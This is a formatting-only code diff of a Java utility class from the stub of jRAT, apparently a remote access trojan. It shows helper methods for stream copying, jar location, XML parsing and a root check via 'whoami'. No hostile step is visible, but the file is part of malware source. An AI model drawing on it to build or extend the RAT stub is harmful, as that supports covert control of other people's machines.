@@ -1,4 +1,5 @@
 package pro.jrat.stub.utils;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
@@ -17,8 +18,6 @@ import org.w3c.dom.NodeList;
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Main;
 
-
-
 public class Utils {
 
 	private static final byte[] BUFFER = new byte[4096 * 1024];
@@ -29,7 +28,7 @@ public class Utils {
 			output.write(BUFFER, 0, bytesRead);
 		}
 	}
-	
+
 	public static File getJarFile() {
 		return new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("file:", ""));
 	}
@@ -46,10 +45,10 @@ public class Utils {
 		}
 		return s.toString();
 	}
-	
+
 	public static String getTagValue(String sTag, Element eElement) {
-		NodeList nlList = eElement.getElementsByTagName(sTag).item(0).getChildNodes();	 
-	    Node nValue = (Node) nlList.item(0); 
+		NodeList nlList = eElement.getElementsByTagName(sTag).item(0).getChildNodes();
+		Node nValue = (Node) nlList.item(0);
 		return nValue.getNodeValue();
 	}
 
@@ -79,14 +78,14 @@ public class Utils {
 		file.mkdirs();
 		return file;
 	}
-	
+
 	public static String getStackTrace(Throwable aThrowable) {
 		Writer result = new StringWriter();
 		PrintWriter printWriter = new PrintWriter(result);
 		aThrowable.printStackTrace(printWriter);
 		return result.toString();
 	}
-	
+
 	public static boolean isRoot() throws Exception {
 		return OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
 	}
